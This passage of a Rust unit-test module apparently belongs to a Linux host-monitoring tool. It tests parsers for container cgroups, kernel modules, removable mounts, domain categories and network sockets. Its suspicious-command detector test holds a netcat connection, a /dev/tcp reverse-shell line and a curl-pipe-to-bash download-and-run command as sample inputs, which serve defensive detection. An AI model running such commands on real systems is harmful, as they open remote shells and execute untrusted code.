        let kube = format!("0::/kubepods.slice/kubepods-burstable-pod.../cri-containerd-{id}.scope");
        assert!(parse_container_from_cgroup(&kube).ends_with(&id[..12]));
        // host process (no container id) → empty
        assert_eq!(parse_container_from_cgroup("0::/init.scope"), "");
    }

    #[test]
    fn proc_modules_first_token() {
        let text = "nf_tables 245760 1 - Live 0x0\nevil_rk 16384 0 - Live 0x0\n";
        assert_eq!(parse_proc_modules(text), vec!["nf_tables", "evil_rk"]);
    }

    #[test]
    fn proc_mounts_filters_to_removable() {
        let text = "\
proc /proc proc rw 0 0
/dev/sda1 / ext4 rw 0 0
/dev/sdb1 /media/usb\\040stick vfat rw 0 0
tmpfs /mnt/should_skip tmpfs rw 0 0
/dev/sdc1 /run/media/bob/DATA exfat rw 0 0";
        let m = parse_proc_mounts(text);
        // root, proc, and tmpfs are excluded; two removable vfat/exfat mounts remain.
        assert_eq!(m.len(), 2);
        assert_eq!(m[0].mountpoint, "/media/usb stick"); // \040 decoded
        assert_eq!(m[0].fstype, "vfat");
        assert_eq!(m[1].mountpoint, "/run/media/bob/DATA");
    }

    #[test]
    fn categorize_domain_buckets() {
        assert_eq!(categorize_domain("mail.google.com"), "webmail");
        assert_eq!(categorize_domain("drive.google.com"), "cloud_storage");
        assert_eq!(categorize_domain("www.dropbox.com"), "cloud_storage");
        assert_eq!(categorize_domain("FACEBOOK.com"), "social"); // case-insensitive
        assert_eq!(categorize_domain("github.com"), "dev");
        assert_eq!(categorize_domain("example.com"), "web");
    }

    #[test]
    fn is_suspicious_flags_tools_and_patterns() {
        assert!(is_suspicious("nc", "nc 10.0.0.1 4444"));
        assert!(is_suspicious("bash", "bash -c 'sh </dev/tcp/x/1'"));
        assert!(is_suspicious("sh", "curl http://x | bash"));
        assert!(!is_suspicious("ls", "ls -la"));
        assert!(!is_suspicious("cat", "cat /etc/hostname"));
    }

    #[test]
    fn truncate_respects_utf8_boundaries() {
        // ASCII under limit unchanged
        assert_eq!(truncate("abc", 10), "abc");
        // multibyte must not panic and must stay valid UTF-8
        let s = "héllo wörld ✓ multibyte";
        let t = truncate(s, 7);
        assert!(t.ends_with('…'));
        assert!(t.is_char_boundary(t.len()));
        // emoji (4-byte) cut point
        let e = "🚀🚀🚀🚀🚀";
        let _ = truncate(e, 5); // must not panic mid-codepoint
    }

    #[test]
    fn remote_addr_helpers() {
        assert!(is_remote("8.8.8.8:443"));
        assert!(!is_remote("127.0.0.1:22"));
        assert!(!is_remote("::1"));
        assert!(!is_remote("0.0.0.0:80"));
        assert_eq!(remote_port("1.2.3.4:443").as_deref(), Some("443"));
        assert_eq!(remote_port("[2001:db8::1]:8080").as_deref(), Some("8080"));
    }

    #[test]
    fn ss_process_malformed_is_safe() {
        // garbage must not panic; yields zeros / empty
        assert_eq!(parse_ss_process("users:((garbage"), (0, String::new()));
        let (pid, name) = parse_ss_process(r#"users:(("sshd",pid=1,fd=3),("x",pid=2,fd=4))"#);
        assert_eq!(pid, 1); // first owner
        assert_eq!(name, "sshd");
    }

    #[test]
    fn longest_hex_run_threshold() {
        assert!(longest_hex_run("/system.slice/init.scope").is_none()); // no long hex
        assert!(longest_hex_run("docker").is_none()); // short
        let id = "abcdef0123456789abcdef0123456789abcd"; // 36 hex
        assert_eq!(longest_hex_run(&format!("x-{id}.scope")).as_deref(), Some(id));
    }

    #[test]
    fn cgroup_podman_crio_and_none() {
        let id = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
        assert!(parse_container_from_cgroup(&format!("0::/machine.slice/libpod-{id}.scope")).starts_with("podman:"));
        assert!(parse_container_from_cgroup(&format!("0::/system.slice/crio-{id}.scope")).starts_with("crio:"));
        assert_eq!(parse_container_from_cgroup("0::/user.slice/user-1000.slice"), "");
    }
}
